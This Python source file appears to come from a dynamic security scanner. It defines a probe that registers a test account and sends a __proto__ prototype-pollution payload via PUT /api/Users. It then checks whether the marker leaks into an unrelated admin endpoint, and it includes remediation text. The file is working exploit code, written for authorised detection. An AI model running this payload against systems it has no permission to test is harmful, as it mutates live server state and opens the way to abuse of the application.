#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Injection: prototype pollution via PUT /api/Users/<id>.

Apps that use libraries like `lodash.merge` or `Object.assign` to
hydrate request bodies into model objects are vulnerable to
`__proto__` pollution: a payload of `{"__proto__":{"X":"Y"}}` adds X
to Object.prototype, after which every object in the running process
inherits the property. The bug surfaces in unrelated endpoints —
which is the high-fidelity probe shape: pollute on one endpoint,
verify on another.

Detection signal:
  PUT /api/Users/<own_id> with `{__proto__: {"jsTpolluted": "<marker>"}}`.
  Then GET /rest/admin/application-version (or a similar endpoint that
  serializes `Object.assign({}, ...)` envelopes). The response
  includes the literal marker as a property of the response object.

Destructive in the sense that the prototype mutation persists for
the lifetime of the Node process — but the polluted property is
random per run, so a single probe run is observable and not visibly
intrusive. We still gate on --allow-destroy because the side effect
is, in the strict sense, server-state mutation.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

USERS_PATH       = "/api/Users/{id}"
APP_VERSION_PATH = "/rest/admin/application-version"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"proto-pollute-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class PrototypePollutionUserPatchProbe(Probe):
    name = "prototype_pollution_user_patch"
    summary = ("Detects __proto__ pollution via PUT /api/Users — "
               "marker leaks into an unrelated endpoint's response.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--verify-path", action="append", default=[],
            help="Additional 'unrelated' endpoint to check for marker "
                 "leak (repeatable).")
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — pollutes Object.prototype for the Node "
                 "process lifetime.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: probe pollutes Object.prototype on "
                         "the running Node process. Re-run with "
                         "--allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token") or not sess.get("user_id"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        marker_key   = f"jsTpolluted{secrets.token_hex(2)}"
        marker_value = f"YES_{secrets.token_hex(4)}"
        body = json.dumps({"__proto__": {marker_key: marker_value}}).encode()
        url = urljoin(origin, USERS_PATH.format(id=sess["user_id"]))
        write = {"step": "patch-proto", "status": None}
        r = client.request("PUT", url, headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }, body=body)
        write.update({"status": r.status, "size": r.size,
                      "body_excerpt": (r.text or "")[:200]})

        verify_paths = [APP_VERSION_PATH] + list(args.verify_path or [])
        leaks: list[dict] = []
        for p in verify_paths:
            v = client.request("GET", urljoin(origin, p),
                               headers={"Authorization": f"Bearer {token}"})
            row = {"path": p, "status": v.status, "size": v.size}
            if v.status == 200 and v.body and marker_value in v.text:
                row["leaked_marker"] = True
                leaks.append(row)
                break
            leaks.append(row)

        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "marker_key": marker_key, "marker_value": marker_value,
                    "patch": write, "verify": leaks}
        if any(row.get("leaked_marker") for row in leaks):
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: prototype pollution via PUT "
                         f"{url} — marker leaked into the response of "
                         "an unrelated endpoint. Object.prototype is "
                         "now polluted for the lifetime of the Node "
                         "process."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Reject `__proto__`, `prototype`, and `constructor` "
                    "keys in any user-supplied JSON merged into a model "
                    "object. Replace `lodash.merge` / "
                    "`_.defaultsDeep` with a deny-list-aware variant or "
                    "construct your model with explicit field copies. "
                    "Restart the Node process — the prototype is "
                    "polluted until the runtime exits."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: PUT with __proto__ payload on {origin} "
                     "did not leak the marker into the verify endpoint."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PrototypePollutionUserPatchProbe().main()
